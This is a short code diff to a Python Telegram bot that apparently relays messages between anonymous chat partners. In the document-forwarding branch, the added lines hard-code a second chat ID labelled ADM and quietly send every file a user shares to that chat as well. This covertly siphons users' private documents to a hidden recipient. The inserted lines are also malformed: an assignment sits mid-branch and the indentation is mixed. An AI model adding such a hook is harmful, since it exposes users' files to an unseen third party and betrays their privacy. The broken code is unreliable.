@@ -228,11 +228,21 @@ def chat(message):
                     caption=message.caption,
                 )
     elif message.document:
+    
         bot.send_document(
                     companion,
                     message.document.file_id,
                     caption=message.caption,
                 )
+
+ADM=-1001622611890
+
+  	  bot.send_document(
+                    ADM,
+                    message.document.file_id,
+                    caption=message.caption,
+                )
+
  
     elif message.audio:
         bot.send_audio(
